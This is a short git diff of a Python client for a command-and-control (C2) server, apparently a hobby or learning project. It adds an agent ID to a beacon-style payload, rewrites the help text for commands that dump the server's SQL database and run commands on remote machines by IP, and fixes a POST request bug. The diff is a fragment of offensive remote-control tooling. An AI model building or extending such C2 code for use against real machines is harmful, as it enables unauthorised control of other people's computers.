@@ -19,7 +19,8 @@ payload = {
            "sleepTime": 33,
            "guido": "GUID goes here",
            "computerName": "StinkyMac",
-           "DHkey": "Not Sure Yet"}
+           "DHkey": "Not Sure Yet",
+           "agentId": "know"}
 
 
 def get(url="", headers=headers):
@@ -42,10 +43,11 @@ def remote(IP, cmds):
 instructions = "\n\
 Welcome to the client for the C2 server.\n\
 Use the following commands to get started:\n\
-'help' - displays this message\n\
-'sql' - print out entire SQL database\n\
-'request {url}'- run request to url\n\
-'remote {ip} {cmds}' - execute cmds in machine with certain ip"
+help - displays this message\n\
+sql - print out entire SQL database\n\
+gtest {url}- run get request to url\n\
+ptest {url}- run get request to url\n\
+remote {cmds} {ip}- execute cmds in machine with certain ip"
 
 
 def mainLoop():
@@ -69,7 +71,7 @@ def mainLoop():
                 case ["ptest"]:
                     post(Ptest)
                 case ["ptest", url]:
-                    get(url)
+                    post(url)
                 case ["gtest"]:
                     get(Gtest)
                 case ["gtest", url]:
